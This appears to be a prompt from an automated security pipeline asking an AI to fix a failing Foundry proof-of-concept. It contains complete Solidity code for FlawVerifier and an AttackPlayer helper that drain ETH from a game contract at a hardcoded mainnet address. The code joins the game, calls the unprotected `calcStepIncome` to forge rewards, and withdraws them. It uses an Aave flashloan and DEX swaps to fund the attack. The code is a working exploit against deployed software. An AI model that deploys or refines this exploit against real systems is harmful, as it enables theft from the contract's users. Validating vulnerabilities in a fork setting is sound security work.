You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Public `calcStepIncome` lets any player mint arbitrary withdrawable rewards
- claim: `calcStepIncome` is `public` and performs no authorization or caller-context checks, so any externally owned account can credit `stepIncome` and `totalSettled` for any PID up to that PID's `playBiggertReward`. Those forged earnings are then withdrawable through `withdraw()`. Because the function also decrements `mainPoolBalance` without checking pool sufficiency, oversized calls can additionally corrupt pool accounting via underflow.
- impact: An attacker can join once, mint themselves rewards they never earned, and withdraw real ETH from `mainPoolWithdrawBalance`. This is a permissionless drain of the round's withdrawable liquidity, with additional accounting corruption if `mainPoolBalance` is driven below zero.
- exploit_paths: ["Join the game to obtain an active PID and a nonzero `playBiggertReward` cap.", "Call `calcStepIncome(attackerPid, attackerChosenValue, attackerChosenDividend)` directly until `totalSettled` reaches the desired forged amount.", "Call `withdraw()` to convert the fabricated balance into ETH from the round's withdrawable pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IAddrManagerLike {
    function getAddr(string calldata name_) external view returns (address);
}

interface IMainPoolLike {
    function joinGame(address parentAddr) external payable;
    function withdraw() external;
    function calcStepIncome(uint256 pid_, uint256 value_, uint8 dividendAccount_) external;

    function getRID() external view returns (uint256 rid_);
    function getPoolInfo(uint256 rid_)
        external
        view
        returns (
            uint256 totalInBalance_,
            uint256 totalDivBalance_,
            uint256 totalInsBalance_,
            uint256 totalPlayers_,
            uint256 totalDisADC_
        );
    function getPlayerInfo(address ply_, uint256 rid_)
        external
        view
        returns (
            uint256 stIncome_,
            uint256 dtIncome_,
            uint256 stepIncome_,
            uint256 ambIncome_,
            uint256 doubV6Income_,
            uint256 totoalIncome_,
            uint256 withdrawAmount_,
            uint256 ticketIn_,
            uint256 canWithdrawAmount_,
            uint256 startTime_,
            uint256 liveRountAmount_
        );

    function plyrID(address player) external view returns (uint256);
    function playBiggertReward(uint256 rid, uint256 pid) external view returns (uint256);
    function mainPoolWithdrawBalance(uint256 rid) external view returns (uint256);
}

interface IFlashLoanSimplePool {
    function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes calldata params, uint16 referralCode)
        external;
}

interface IUniswapV2RouterLike {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract AttackPlayer {
    address public immutable owner;
    address public immutable target;

    bool public joined;
    bytes32 public joinErrorHash;

    receive() external payable {}

    constructor(address target_, address parent_) payable {
        owner = msg.sender;
        target = target_;

        (bool ok, bytes memory ret) =
            target_.call{value: msg.value}(abi.encodeWithSelector(IMainPoolLike.joinGame.selector, parent_));
        joined = ok;
        if (!ok && ret.length >= 32) {
            assembly {
                sstore(joinErrorHash.slot, mload(add(ret, 32)))
            }
        }
    }

    function callCalcStep(uint256 pid, uint256 value, uint8 dividend) external returns (bool ok, bytes memory ret) {
        require(msg.sender == owner, "not-owner");
        (ok, ret) = target.call(abi.encodeWithSelector(IMainPoolLike.calcStepIncome.selector, pid, value, dividend));
    }

    function callWithdraw() external returns (bool ok, bytes memory ret) {
        require(msg.sender == owner, "not-owner");
        (ok, ret) = target.call(abi.encodeWithSelector(IMainPoolLike.withdraw.selector));
    }

    function sweepToken(address token, address to) external returns (uint256 amount) {
        require(msg.sender == owner, "not-owner");
        amount = IERC20Like(token).balanceOf(address(this));
        if (amount > 0) {
            require(IERC20Like(token).transfer(to, amount), "token-sweep-failed");
        }
    }

    function sweepEth(address payable to) external returns (uint256 amount) {
        require(msg.sender == owner, "not-owner");
        amount = address(this).balance;
        if (amount > 0) {
            (bool ok,) = to.call{value: amount}("");
            require(ok, "eth-sweep-failed");
        }
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8;
    address internal constant ADDR_MANAGER = 0x49E298B95Bda30e6518509187Ff348e01117f404;
    address internal constant PARENT = 0x953ad059b61aA4A23fa48d5eca617D4920E3343e;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    bytes32 internal constant HELPER_SALT = keccak256("adc-f001-helper");
    uint256 internal constant FLASHLOAN_WETH = 100 ether;
    uint256 internal constant MAX_ROUTER_SPEND = 25 ether;
    uint256 internal constant JOIN_BUFFER_FOR_DIRECT = 10 ether;

    uint256 internal _baselineEth;
    uint256 internal _profitAmount;
    bool internal _executed;

    address internal _adc;
    address internal _ticket;
    address internal _helper;

    bool public hypothesisValidated;
    bool public joinedGame;
    bool public calcStepUsed;
    bool public withdrewProfit;
    bool public usedFlashloan;

    uint256 public attackRid;
    uint256 public attackerPid;
    uint256 public joinValueUsed;
    uint256 public preJoinWithdrawBalance;
    uint256 public postJoinWithdrawBalance;
    uint256 public preMintWithdrawable;
    uint256 public forgedMintAmount;
    uint256 public finalClaimAmount;
    uint256 public joinBurnAdc;
    uint256 public withdrawBurnAdc;
    bytes32 public lastFailure;

    receive() external payable {}

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            _syncProfit();
            return;
        }

        _executed = true;
        _baselineEth = address(this).balance;

        _adc = IAddrManagerLike(ADDR_MANAGER).getAddr("ADC");
        _ticket = IAddrManagerLike(ADDR_MANAGER).getAddr("TICKET");
        if (_adc == address(0) || _ticket == address(0)) {
            lastFailure = keccak256("addr-manager-missing");
            _syncProfit();
            return;
        }

        uint256 desiredJoinValue = _selectJoinValue();
        if (address(this).balance >= desiredJoinValue + JOIN_BUFFER_FOR_DIRECT) {
            _runExploit(desiredJoinValue);
            _syncProfit();
            return;
        }

        usedFlashloan = true;
        (bool ok,) = AAVE_V3_POOL.call(
            abi.encodeWithSelector(
                IFlashLoanSimplePool.flashLoanSimple.selector,
                address(this),
                WETH,
                FLASHLOAN_WETH,
                abi.encode(desiredJoinValue),
                uint16(0)
            )
        );
        if (!ok && !joinedGame) {
            lastFailure = keccak256("flashloan-unavailable-or-unprofitable");
        }

        _syncProfit();
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external
        returns (bool)
    {
        require(msg.sender == AAVE_V3_POOL, "not-aave-pool");
        require(asset == WETH, "unexpected-asset");
        require(initiator == address(this), "unexpected-initiator");

        IWETHLike(WETH).withdraw(amount);

        uint256 desiredJoinValue = abi.decode(params, (uint256));
        _runExploit(desiredJoinValue);

        uint256 repayAmount = amount + premium;
        if (address(this).balance >= repayAmount) {
            IWETHLike(WETH).deposit{value: repayAmount}();
        } else {
            revert("insufficient-weth-for-repay");
        }
        require(IERC20Like(WETH).approve(AAVE_V3_POOL, repayAmount), "approve-failed");
        return true;
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runExploit(uint256 desiredJoinValue) internal {
        attackRid = IMainPoolLike(TARGET).getRID();

        (, uint256 totalDivBefore,,,) = IMainPoolLike(TARGET).getPoolInfo(attackRid);
        preJoinWithdrawBalance = IMainPoolLike(TARGET).mainPoolWithdrawBalance(attackRid);

        joinValueUsed = _capJoinValue(desiredJoinValue, preJoinWithdrawBalance, totalDivBefore);
        if (joinValueUsed < 1 ether) {
            // Path stage 1 is infeasible if the verifier cannot even fund the minimum 1 ETH ticket.
            lastFailure = keccak256("insufficient-join-capital");
            return;
        }

        (bool joinBurnOk, uint256 joinBurn) = _quoteAdc(joinValueUsed, true);
        if (!joinBurnOk) {
            // Path stage 1 is infeasible if the live TICKET contract cannot quote the entry burn.
            lastFailure = keccak256("join-burn-quote-failed");
            return;
        }
        joinBurnAdc = joinBurn;

        address helperPrediction = _computeHelperAddress();
        if (!_ensureAdcAt(helperPrediction, joinBurnAdc)) {
            // Path stage 1 is infeasible on this fork if the verifier cannot acquire the required ADC
            // for the helper address using public AMM routes before the constructor-time join.
            lastFailure = keccak256("join-adc-unavailable");
            return;
        }

        AttackPlayer helper = new AttackPlayer{salt: HELPER_SALT, value: joinValueUsed}(TARGET, PARENT);
        _helper = address(helper);

        if (!helper.joined()) {
            lastFailure = keccak256("join-call-failed");
            return;
        }

        attackerPid = IMainPoolLike(TARGET).plyrID(_helper);
        if (attackerPid == 0) {
            lastFailure = keccak256("pid-not-created");
            return;
        }

        joinedGame = true;

        (
            ,
            ,
            ,
            ,
            ,
            uint256 totalIncomeBefore,
            ,
            uint256 ticketInAfterJoin,
            uint256 canWithdrawBefore,
            ,
            uint256 liveRoundAmountBefore
        ) = IMainPoolLike(TARGET).getPlayerInfo(_helper, attackRid);

        postJoinWithdrawBalance = IMainPoolLike(TARGET).mainPoolWithdrawBalance(attackRid);
        preMintWithdrawable = canWithdrawBefore;

        if (ticketInAfterJoin == 0) {
            lastFailure = keccak256("join-did-not-activate-player");
            return;
        }

        uint256 rewardCap = IMainPoolLike(TARGET).playBiggertReward(attackRid, attackerPid);
        if (rewardCap == 0 && liveRoundAmountBefore == 0) {
            // Path stage 1 requires a nonzero reward cap after joining.
            lastFailure = keccak256("zero-reward-cap");
            return;
        }

        uint256 capRemaining = rewardCap > totalIncomeBefore ? rewardCap - totalIncomeBefore : 0;
        uint256 poolRoom = postJoinWithdrawBalance > canWithdrawBefore + 1
            ? postJoinWithdrawBalance - canWithdrawBefore - 1
            : 0;

        forgedMintAmount = capRemaining < poolRoom ? capRemaining : poolRoom;
        if (forgedMintAmount == 0) {
            // Path stage 2 cannot produce a payable forged balance if either the player's cap is already exhausted
            // or the round only has the bugged exact-remainder branch left.
            lastFailure = keccak256("no-safe-forge-room");
            return;
        }

        finalClaimAmount = canWithdrawBefore + forgedMintAmount;

        (bool withdrawBurnOk, uint256 outBurn) = _quoteAdc(finalClaimAmount, false);
        if (!withdrawBurnOk) {
            lastFailure = keccak256("withdraw-burn-quote-failed");
            return;
        }
        withdrawBurnAdc = outBurn;

        if (!_ensureAdcAt(_helper, withdrawBurnAdc)) {
            // Path stage 3 is infeasible on this fork if the verifier cannot source the ADC needed
            // to pass the withdrawal gate for the forged claim.
            lastFailure = keccak256("withdraw-adc-unavailable");
            return;
        }

        // Path stage 2: directly call the public calcStepIncome on the attacker's PID to fabricate rewards.
        (bool calcOk,) = helper.callCalcStep(attackerPid, forgedMintAmount, 100);
        if (!calcOk) {
            lastFailure = keccak256("calc-step-call-failed");
            return;
        }
        calcStepUsed = true;

        (
            ,
            ,
            ,
            ,
            ,
            ,
            ,
            ,
            uint256 canWithdrawAfterMint,
            ,
        ) = IMainPoolLike(TARGET).getPlayerInfo(_helper, attackRid);

        if (canWithdrawAfterMint <= canWithdrawBefore) {
            lastFailure = keccak256("mint-not-credited");
            return;
        }

        // Path stage 3: withdraw the fabricated balance as native ETH from the round's withdrawable pool.
        (bool withdrawOk,) = helper.callWithdraw();
        if (!withdrawOk) {
            lastFailure = keccak256("withdraw-call-failed");
            return;
        }
        withdrewProfit = true;
        hypothesisValidated = true;

        helper.sweepEth(payable(address(this)));
        helper.sweepToken(_adc, address(this));

        _syncProfit();
    }

    function _selectJoinValue() internal view returns (uint256) {
        uint256 rid = IMainPoolLike(TARGET).getRID();
        (, uint256 totalDivBalance,,,) = IMainPoolLike(TARGET).getPoolInfo(rid);
        uint256 withdrawBalance = IMainPoolLike(TARGET).mainPoolWithdrawBalance(rid);

        uint256 safePool = totalDivBalance < withdrawBalance ? totalDivBalance : withdrawBalance;
        if (safePool >= 60 ether) {
            return 31 ether;
        }
        if (safePool >= 20 ether) {
            return 11 ether;
        }
        return 1 ether;
    }

    function _capJoinValue(uint256 desiredJoinValue, uint256 withdrawBalanceBefore, uint256 totalDivBefore)
        internal
        pure
        returns (uint256)
    {
        uint256 safePool = withdrawBalanceBefore < totalDivBefore ? withdrawBalanceBefore : totalDivBefore;
        if (desiredJoinValue >= 31 ether && safePool >= 60 ether) {
            return 31 ether;
        }
        if (desiredJoinValue >= 11 ether && safePool >= 20 ether) {
            return 11 ether;
        }
        return 1 ether;
    }

    function _quoteAdc(uint256 value, bool isIn) internal view returns (bool ok, uint256 quoted) {
        bytes memory ret;
        (ok, ret) = _ticket.staticcall(abi.encodeWithSignature("calDeductionADC(uint256,bool)", value, isIn));
        if (!ok || ret.length < 32) {
            return (false, 0);
        }
        quoted = abi.decode(ret, (uint256));
    }

    function _ensureAdcAt(address recipient, uint256 needed) internal returns (bool) {
        if (needed == 0) {
            return true;
        }

        uint256 bal = IERC20Like(_adc).balanceOf(recipient);
        if (bal >= needed) {
            return true;
        }

        uint256 shortfall = needed - bal;
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = _adc;

        if (_tryRoutersExactOut(recipient, shortfall, path)) {
            return IERC20Like(_adc).balanceOf(recipient) >= needed;
        }

        _tryRoutersExactIn(recipient, needed, path);
        return IERC20Like(_adc).balanceOf(recipient) >= needed;
    }

    function _tryRoutersExactOut(address recipient, uint256 amountOut, address[] memory path) internal returns (bool) {
        address[2] memory routers = [UNISWAP_V2_ROUTER, SUSHISWAP_ROUTER];
        for (uint256 i = 0; i < routers.length; ++i) {
            address router = routers[i];
            if (!_pairExists(router, path[1])) {
                continue;
            }

            uint256 spendCap = address(this).balance;
            if (spendCap > MAX_ROUTER_SPEND) {
                spendCap = MAX_ROUTER_SPEND;
            }
            if (spendCap == 0) {
                return false;
            }

            (bool ok,) = router.call{value: spendCap}(
                abi.encodeWithSelector(
                    IUniswapV2RouterLike.swapETHForExactTokens.selector,
                    amountOut,
                    path,
                    recipient,
                    block.timestamp
                )
            );
            if (ok) {
                return true;
            }
        }
        return false;
    }

    function _tryRoutersExactIn(address recipient, uint256 needed, address[] memory path) internal {
        address[2] memory routers = [UNISWAP_V2_ROUTER, SUSHISWAP_ROUTER];
        uint256[6] memory budgets = [uint256(0.01 ether), 0.05 ether, 0.2 ether, 1 ether, 5 ether, 20 ether];

        for (uint256 i = 0; i < routers.length; ++i) {
            address router = routers[i];
            if (!_pairExists(router, path[1])) {
                continue;
            }

            for (uint256 j = 0; j < budgets.length; ++j) {
                if (IERC20Like(_adc).balanceOf(recipient) >= needed) {
                    return;
                }

                uint256 spend = budgets[j];
                if (spend > address(this).balance) {
                    spend = address(this).balance;
                }
                if (spend == 0) {
                    return;
                }

                (bool ok,) = router.call{value: spend}(
                    abi.encodeWithSelector(
                        IUniswapV2RouterLike.swapExactETHForTokensSupportingFeeOnTransferTokens.selector,
                        0,
                        path,
                        recipient,
                        block.timestamp
                    )
                );
                ok;
            }
        }
    }

    function _pairExists(address router, address token) internal view returns (bool) {
        address factory = IUniswapV2RouterLike(router).factory();
        return IUniswapV2FactoryLike(factory).getPair(WETH, token) != address(0);
    }

    function _computeHelperAddress() internal view returns (address) {
        bytes memory initCode = abi.encodePacked(type(AttackPlayer).creationCode, abi.encode(TARGET, PARENT));
        bytes32 hash = keccak256(
            abi.encodePacked(bytes1(0xff), address(this), HELPER_SALT, keccak256(initCode))
        );
        return address(uint160(uint256(hash)));
    }

    function _syncProfit() internal {
        uint256 current = address(this).balance;
        _profitAmount = current > _baselineEth ? current - _baselineEth : 0;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
